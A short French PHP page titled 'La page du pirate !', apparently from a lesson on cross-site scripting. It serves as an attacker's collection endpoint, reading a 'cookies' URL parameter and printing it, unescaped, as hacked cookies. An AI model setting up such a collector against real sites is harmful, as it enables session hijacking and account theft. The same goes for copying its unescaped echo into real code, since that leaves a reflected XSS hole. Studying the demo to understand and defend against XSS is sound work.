<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8" />
    </head>
    <body>
        <h1>La page du pirate !</h1>

        <?php
        if(!empty($_GET['cookies']))
        {
            echo "Les cookies piratés : ".$_GET['cookies'];
        } 
        ?>

    </body>
</html>